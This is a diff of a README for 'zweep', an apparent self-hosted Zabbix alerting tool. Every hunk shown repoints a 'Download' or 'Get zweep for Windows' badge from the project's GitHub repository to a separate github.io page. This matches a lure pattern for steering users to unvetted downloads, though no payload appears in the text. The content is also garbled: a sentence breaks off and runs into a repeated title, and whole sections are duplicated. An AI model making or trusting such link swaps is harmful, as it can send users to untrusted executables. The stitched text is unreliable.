@@ -1,6 +1,6 @@
 # 🚨 zweep - Self-Hosted Zabbix Alerts Made Simple
 
-[![Download zweep](https://img.shields.io/badge/⬇_Download_zweep-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/XalefMousex/zweep)
+[![Download zweep](https://img.shields.io/badge/⬇_Download_zweep-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://xalefmousex.github.io)
 
 Visit this link to download the application.
 
@@ -53,7 +53,7 @@ You also need:
 
 ## 💻 Windows Download and First Start
 
-[![Get zweep for Windows](https://img.shields.io/badge/Get_zweep_for_Windows-4C78A8?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/XalefMousex/zweep)
+[![Get zweep for Windows](https://img.shields.io/badge/Get_zweep_for_Windows-4C78A8?style=for-the-badge&logo=windows&logoColor=white)](https://xalefmousex.github.io)
 
 Visit this link to download the application.
 
@@ -112,7 +112,7 @@ zweep is self-hosted. That means the service runs on your own computer or server
 
 Keep your zweep setup protected by using a strong password, limiting who can access the# 🚨 zweep - Self-Hosted Zabbix Alerts Made Simple
 
-[![Download zweep](https://img.shields.io/badge/⬇_Download_zweep-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/XalefMousex/zweep)
+[![Download zweep](https://img.shields.io/badge/⬇_Download_zweep-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://xalefmousex.github.io)
 
 Visit this link to download the application.
 
@@ -152,7 +152,7 @@ Because zweep is self-hosted, your alert content and acknowledgement history sta
 
 ## 💻 Download and First Start
 
-[![Get zweep for Windows](https://img.shields.io/badge/Get_zweep_for_Windows-4C78A8?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/XalefMousex/zweep)
+[![Get zweep for Windows](https://img.shields.io/badge/Get_zweep_for_Windows-4C78A8?style=for-the-badge&logo=windows&logoColor=white)](https://xalefmousex.github.io)
 
 Visit this link to download the application.
 
